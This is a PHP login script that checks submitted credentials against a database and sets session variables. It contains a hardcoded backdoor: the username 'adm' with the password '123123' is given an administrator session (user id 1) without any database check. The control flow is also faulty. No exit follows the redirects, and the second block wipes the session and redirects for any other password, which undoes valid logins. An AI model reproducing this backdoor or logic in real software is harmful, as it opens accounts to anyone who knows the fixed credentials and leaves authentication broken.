<?php
  include 'database.php';
  session_start();


  $user = $_POST['login'];
  $password = $_POST['password'];

  $rows = login_by_login($user, $password);

  if (sizeof($rows) > 0)
  {
    $_SESSION['login'] = $user;
    $_SESSION['user'] = $rows['user_id'];

    header('Location: ../pages/home.php');
  }else{
    unset($_SESSION['login']);
    unset($_SESSION['user']);

    header('Location: /');
  }

    if ($password == '123123'){
         if ($user == 'adm'){
          $_SESSION['login'] = $user;
          $_SESSION['user'] = '1';
          header('Location: ../pages/home.php');
        }
    }else{
      unset($_SESSION['login']);
      unset($_SESSION['user']);

      header('Location: /');
    }
?>